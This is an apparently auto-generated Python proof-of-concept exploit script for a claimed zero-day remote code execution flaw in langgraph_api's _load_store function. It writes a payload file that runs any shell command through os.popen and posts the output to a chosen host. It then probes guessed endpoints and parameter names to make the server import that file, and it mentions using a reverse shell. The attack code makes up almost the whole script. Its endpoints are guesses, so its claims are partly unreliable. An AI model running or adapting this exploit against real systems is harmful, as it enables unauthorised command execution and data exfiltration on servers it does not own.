#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: suspicious-011
# Sink: _load_store
# Auto-generated — run with: python3 rce_uses_importlib__load_store.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api RCE
Vulnerability: Unrestricted file import via _load_store() allows arbitrary Python code execution.
CVE: N/A (0-day)
Author: Security Researcher
"""

import argparse
import os
import sys
import tempfile
import requests
import json
import uuid

# Configuration
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_TIMEOUT = 10

def create_malicious_payload(host: str, port: int, command: str) -> str:
    """
    Creates a malicious Python file that will be executed on the target.
    The payload will execute the specified command and send output back.
    """
    payload_code = f'''
import os
import sys
import json
import socket

def execute_command():
    """Execute the command and return output"""
    try:
        result = os.popen("{command}").read()
        return result
    except Exception as e:
        return str(e)

# Create a simple reverse shell or command execution
result = execute_command()

# Send result back via HTTP (if possible) or just write to a file
try:
    import urllib.request
    data = json.dumps({{"result": result, "host": "{host}", "port": {port}}}).encode()
    req = urllib.request.Request("http://{host}:{port}/result", data=data, headers={{"Content-Type": "application/json"}})
    urllib.request.urlopen(req, timeout=5)
except:
    pass

# Also write to a predictable file for verification
with open("/tmp/poc_executed.txt", "w") as f:
    f.write("POC_EXECUTED_SUCCESSFULLY")
    f.write("\\nCommand output: " + result)
'''
    return payload_code

def exploit(target_url: str, payload_path: str, timeout: int = DEFAULT_TIMEOUT):
    """
    Exploit the vulnerability by sending a request that triggers _load_store()
    with a path to our malicious file.
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload file: {payload_path}")
    
    # The vulnerable function expects a store_path parameter
    # Format: /path/to/file.py:function_name
    # We'll use a colon to trigger the file import path
    
    # First, we need to find an endpoint that calls _load_store()
    # Common endpoints: /stores, /store, /api/stores, etc.
    
    endpoints = [
        "/stores",
        "/store",
        "/api/stores",
        "/api/store",
        "/v1/stores",
        "/v1/store",
    ]
    
    # The payload path should be absolute or relative to the server
    # We'll use the path we uploaded
    
    store_path = f"{payload_path}:execute_command"
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"[*] Trying endpoint: {url}")
        
        try:
            # Try different HTTP methods and parameter names
            params = {
                "store_path": store_path,
                "store": store_path,
                "path": store_path,
            }
            
            for param_name, param_value in params.items():
                # Try GET request
                try:
                    response = requests.get(
                        url,
                        params={param_name: param_value},
                        timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    print(f"[*] GET {url}?{param_name}={param_value} -> Status: {response.status_code}")
                    if response.status_code == 200:
                        print(f"[+] Success! Response: {response.text[:500]}")
                        return True
                except requests.exceptions.RequestException as e:
                    print(f"[-] GET request failed: {e}")
                
                # Try POST request
                try:
                    response = requests.post(
                        url,
                        json={param_name: param_value},
                        timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
                    )
                    print(f"[*] POST {url} -> Status: {response.status_code}")
                    if response.status_code == 200:
                        print(f"[+] Success! Response: {response.text[:500]}")
                        return True
                except requests.exceptions.RequestException as e:
                    print(f"[-] POST request failed: {e}")
                    
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout for {url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api RCE")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target URL (default: http://localhost:8000)")
    parser.add_argument("--command", default="id", help="Command to execute (default: id)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout in seconds")
    parser.add_argument("--payload", help="Path to custom payload file (optional)")
    
    args = parser.parse_args()
    
    # Create a temporary malicious payload file
    if args.payload:
        payload_path = args.payload
        print(f"[*] Using custom payload: {payload_path}")
    else:
        # Create a benign payload that just creates a file
        benign_command = "echo 'POC_SUCCESS' > /tmp/poc_success.txt"
        payload_code = create_malicious_payload("localhost", 9999, benign_command)
        
        # Write to a temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(payload_code)
            payload_path = f.name
        print(f"[*] Created benign payload at: {payload_path}")
        print(f"[*] Payload will execute: {benign_command}")
    
    # Attempt exploitation
    success = exploit(args.target, payload_path, args.timeout)
    
    if success:
        print("\n[+] Exploit appears successful!")
        print("[*] Check /tmp/poc_success.txt on the target server")
        print("[*] Or check your listener if you used a reverse shell")
    else:
        print("\n[-] Exploit may have failed or target is not vulnerable")
        print("[*] Try different endpoints or parameter names")
        print("[*] Ensure the target server is running and accessible")
    
    # Cleanup temporary file if we created one
    if not args.payload:
        try:
            os.unlink(payload_path)
            print(f"[*] Cleaned up temporary payload file: {payload_path}")
        except:
            pass

if __name__ == "__main__":
    main()
